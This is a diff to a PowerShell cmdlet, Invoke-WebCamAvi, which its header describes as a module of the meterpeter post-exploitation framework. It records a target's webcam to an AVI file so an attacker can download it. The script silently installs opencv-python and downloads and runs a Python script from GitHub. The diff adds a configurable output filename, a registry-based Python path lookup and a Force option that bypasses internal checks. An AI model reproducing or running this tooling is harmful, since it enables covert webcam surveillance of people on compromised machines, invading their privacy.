@@ -5,9 +5,9 @@
    Author: @r00t-3xp10it
    Credits: @AHLASaad \ @AvinabSaha
    Tested Under: Windows 10 (19044) x64 bits
-   Required Dependencies: python3 {opencv-python}
-   Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.5
+   Required Dependencies: python3
+   Optional Dependencies: opencv-python
+   PS cmdlet Dev version: v1.0.6
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.12 that uses opencv-python to record
@@ -15,13 +15,17 @@
 
 .NOTES
    Remark: recording of webcam turns 'on' the camera ligth.
-   Remark: cmdlet will auto-install 'opencv-python' using pip3 (silent)
+   Remark: cmdlet will auto-install 'opencv-python' package using pip3 (silent)
    Parameter RecTime accepts values from 5 seconds (minimum) up to 60 seconds (max)
-   to prevent the AVI file to be very large if attacker needs to download it from target.
-   Alternatively -Force 'true' parameter can be used to bypass some cmdlet restrictions.
+   to prevent the AVI file to be very large if attacker needs to download it from host.
+   Alternatively -Force 'true' parameter can be used to bypass cmdlet 'record time' and
+   internal cmdlet 'checks\tests' default configuration restrictions.
 
 .Parameter RecTime
    The amount of time to rec in seconds (default: 10)
+
+.Parameter FileName
+   The video.avi file name (default: meterpeter.avi)
 
 .Parameter WorkingDir
    Cmdlet working directory (default: $Env:TMP)
@@ -35,6 +39,10 @@
 .EXAMPLE
    PS C:\> .\Invoke-WebCamAvi.ps1 -RecTime '15'
    Record webcam live stream for 15 seconds time
+
+.EXAMPLE
+   PS C:\> .\Invoke-WebCamAvi.ps1 -FileName "capture.avi"
+   Record webcam live on capture.avi video file name
 
 .EXAMPLE
    PS C:\> .\Invoke-WebCamAvi.ps1 -WorkingDir "$Env:TMP"
@@ -56,7 +64,7 @@
      + Downloading python script from github.
      + Starting live capture for '10' seconds.
      + Comverting webcam raw data to AVI format.
-   * Storage: 'C:\Users\pedro\AppData\Local\Temp\outpy.avi'
+   * Storage: 'C:\Users\pedro\AppData\Local\Temp\meterpeter.avi'
 
 .LINK
    https://github.com/r00t-3xp10it/meterpeter
@@ -66,6 +74,7 @@
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$FileName="meterpeter.avi",
    [string]$WorkingDir="$Env:TMP",
    [string]$AutoView="False",
    [string]$Force="false",
@@ -73,7 +82,7 @@
 )
 
 
-$cmdletver = "v1.0.5"
+$cmdletver = "v1.0.6"
 $StartPath = (Get-Location).Path
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
@@ -151,22 +160,49 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam
 
 
 #Config python script
-$ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py"
-$MyPath = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Programs\python" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
-If(-not($MyPath) -and ($Force -ieq "false"))
+$ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py" -Raw
+$RegInstallPath = Get-ItemProperty -Path 'HKCU:\SOFTWARE\Python\PythonCore\***\InstallPath'|Select-Object -ExpandProperty '(default)'
+If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
+{
+   write-host "  x " -ForegroundColor Red -NoNewline
+   write-host "Notfound: " -ForegroundColor DarkGray -NoNewline
+   write-host "HKCU:\SOFTWARE\Python\PythonCore\***\InstallPath" -ForegroundColor Red
+   Start-Sleep -Seconds 1
+
+   $RegInstallPath = "$Env:LOCALAPPDATA\Programs\python"
+   write-host "  + " -ForegroundColor Yellow -NoNewline
+   write-host "Use-path: " -ForegroundColor DarkGray -NoNewline
+   write-host "$Env:LOCALAPPDATA\Programs\python" -ForegroundColor Green
+}
+
+$PythonInstallPath = (Get-ChildItem -Path "$RegInstallPath" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
+If(-not($PythonInstallPath) -and ($Force -ieq "false"))
 {
    write-host "x " -ForegroundColor Red -NoNewline
    write-host "Error: " -ForegroundColor DarkGray -NoNewline
-   write-host "Python3 site-packages directory not found.`n" -ForegroundColor Red
+   write-host "Python3 site-packages dir not found.`n" -ForegroundColor Red
    return
 }
 
-If($MyPath)
+If($PythonInstallPath)
 {
    #replace path in python script
-   $ReplaceMe = $MyPath -replace '\\','\\'
-   ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "c:\\\\users\\\\pedro\\\\appdata\\\\local\\\\programs\\\\python\\\\python39\\\\lib\\\\site-packages","$ReplaceMe")|Set-Content -Path $WorkingDir\WebCam.py
+   $ReplaceMe = $PythonInstallPath -replace '\\','\\'
+   ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "c:\\\\users\\\\pedro\\\\appdata\\\\local\\\\programs\\\\python\\\\python39\\\\lib\\\\site-packages","$ReplaceMe")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
 }
+Else
+{
+   ## Fail to retrieve Python site-packages directory
+   # plus -force 'true' == Delete path from webcam.py
+   write-host "  + " -ForegroundColor Yellow -NoNewline
+   write-host "Force execution: " -ForegroundColor DarkGray -NoNewline
+   write-host "site-packages directory not found." -ForegroundColor DarkYellow
+   $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py" -Raw|Select-Object -Skip 2
+   echo $ParseRawData > "$WorkingDir\WebCam.py"
+}
+
+#Rename the output video.avi file
+((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "outpy.avi","$FileName")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
 
 
 cd $WorkingDir
@@ -193,7 +229,7 @@ Start-Sleep -Seconds 7 #Give some time to allow avi to finish
 Remove-Item -Path "$WorkingDir\WebCam.py" -Force
 write-host "* " -ForegroundColor Green -NoNewline
 write-host "Storage: '" -ForegroundColor DarkGray -NoNewline
-write-host "$WorkingDir\outpy.avi" -ForegroundColor Green -NoNewline
+write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
 write-host "'" -ForegroundColor DarkGray
 
 
@@ -202,7 +238,7 @@ If($AutoView -ieq "true")
    #Auto-Start video file
    write-host "* " -ForegroundColor Green -NoNewline
    write-host "[local]: Auto-Start of AVI video file."
-   Start-Process "$WorkingDir\outpy.avi"
+   Start-Process "${WorkingDir}\${FileName}"
 }
 
 write-host ""
